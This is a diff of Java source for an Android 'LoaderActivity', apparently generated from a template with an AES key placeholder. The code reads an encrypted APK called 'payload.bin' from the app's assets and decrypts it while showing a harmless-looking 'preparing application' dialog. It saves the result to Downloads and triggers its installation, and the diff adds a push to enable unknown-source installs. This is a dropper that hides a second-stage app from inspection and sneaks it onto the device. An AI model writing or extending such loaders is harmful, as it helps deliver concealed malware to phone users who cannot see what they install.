@@ -291,9 +291,10 @@ import android.app.AlertDialog;
 import android.content.Intent;
 import android.net.Uri;
 import android.os.Bundle;
+import android.os.Environment;
 import android.os.Handler;
 import android.os.Looper;
-import android.widget.Toast;
+import android.provider.Settings;
 import java.io.*;
 import javax.crypto.Cipher;
 import javax.crypto.spec.GCMParameterSpec;
@@ -302,12 +303,36 @@ import javax.crypto.spec.SecretKeySpec;
 public class LoaderActivity extends Activity {{
     
     private static final byte[] AES_KEY = hexToBytes("{aes_key_hex}");
+    private File apkFile;
     
     @Override
     protected void onCreate(Bundle savedInstanceState) {{
         super.onCreate(savedInstanceState);
         
-        // Показываем диалог что приложение загружается
+        // Проверяем разрешение на установку
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {{
+            if (!getPackageManager().canRequestPackageInstalls()) {{
+                startActivityForResult(
+                    new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES)
+                        .setData(Uri.parse("package:" + getPackageName())),
+                    1234
+                );
+                return;
+            }}
+        }}
+        
+        startDecryption();
+    }}
+    
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {{
+        super.onActivityResult(requestCode, resultCode, data);
+        if (requestCode == 1234) {{
+            startDecryption();
+        }}
+    }}
+    
+    private void startDecryption() {{
         final AlertDialog.Builder builder = new AlertDialog.Builder(this);
         builder.setTitle("Загрузка");
         builder.setMessage("Подготовка приложения...");
@@ -321,7 +346,6 @@ public class LoaderActivity extends Activity {{
                 try {{
                     updateDialog(dialog, "Чтение данных...");
                     
-                    // Читаем зашифрованный APK из assets
                     InputStream is = getAssets().open("payload.bin");
                     ByteArrayOutputStream baos = new ByteArrayOutputStream();
                     byte[] buffer = new byte[8192];
@@ -334,23 +358,22 @@ public class LoaderActivity extends Activity {{
                     
                     updateDialog(dialog, "Расшифровка (" + encryptedApk.length + " байт)...");
                     
-                    // Расшифровываем APK
-                    final byte[] decryptedApk = decryptAES(encryptedApk);
+                    byte[] decryptedApk = decryptAES(encryptedApk);
                     
                     updateDialog(dialog, "Сохранение (" + decryptedApk.length + " байт)...");
                     
-                    // Сохраняем расшифрованный APK
-                    final File apkFile = new File(getCacheDir(), "app.apk");
+                    // Сохраняем в Downloads
+                    File downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
+                    apkFile = new File(downloadsDir, "app_decrypted.apk");
                     FileOutputStream fos = new FileOutputStream(apkFile);
                     fos.write(decryptedApk);
                     fos.close();
                     
-                    // Закрываем диалог и устанавливаем
                     new Handler(Looper.getMainLooper()).post(new Runnable() {{
                         @Override
                         public void run() {{
                             dialog.dismiss();
-                            installApk(apkFile);
+                            installApk();
                         }}
                     }});
                     
@@ -360,18 +383,7 @@ public class LoaderActivity extends Activity {{
                         @Override
                         public void run() {{
                             dialog.dismiss();
-                            AlertDialog.Builder errorBuilder = new AlertDialog.Builder(LoaderActivity.this);
-                            errorBuilder.setTitle("Ошибка");
-                            errorBuilder.setMessage("Не удалось загрузить приложение:\\n" + e.getMessage());
-                            errorBuilder.setPositiveButton("OK", null);
-                            AlertDialog errorDialog = errorBuilder.create();
-                            errorDialog.setOnDismissListener(new android.content.DialogInterface.OnDismissListener() {{
-                                @Override
-                                public void onDismiss(android.content.DialogInterface d) {{
-                                    finish();
-                                }}
-                            }});
-                            errorDialog.show();
+                            showError(e.getMessage());
                         }}
                     }});
                 }}
@@ -386,6 +398,21 @@ public class LoaderActivity extends Activity {{
                 dialog.setMessage(message);
             }}
         }});
+    }}
+    
+    private void showError(final String error) {{
+        AlertDialog.Builder errorBuilder = new AlertDialog.Builder(this);
+        errorBuilder.setTitle("Ошибка");
+        errorBuilder.setMessage("Не удалось загрузить приложение:\\n" + error);
+        errorBuilder.setPositiveButton("OK", null);
+        AlertDialog errorDialog = errorBuilder.create();
+        errorDialog.setOnDismissListener(new android.content.DialogInterface.OnDismissListener() {{
+            @Override
+            public void onDismiss(android.content.DialogInterface d) {{
+                finish();
+            }}
+        }});
+        errorDialog.show();
     }}
     
     private byte[] decryptAES(byte[] encrypted) throws Exception {{
@@ -409,10 +436,10 @@ public class LoaderActivity extends Activity {{
         return cipher.doFinal(input);
     }}
     
-    private void installApk(File apkFile) {{
+    private void installApk() {{
         Intent intent = new Intent(Intent.ACTION_VIEW);
         intent.setDataAndType(Uri.fromFile(apkFile), "application/vnd.android.package-archive");
-        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_GRANT_READ_URI_PERMISSION);
         startActivity(intent);
         finish();
     }}
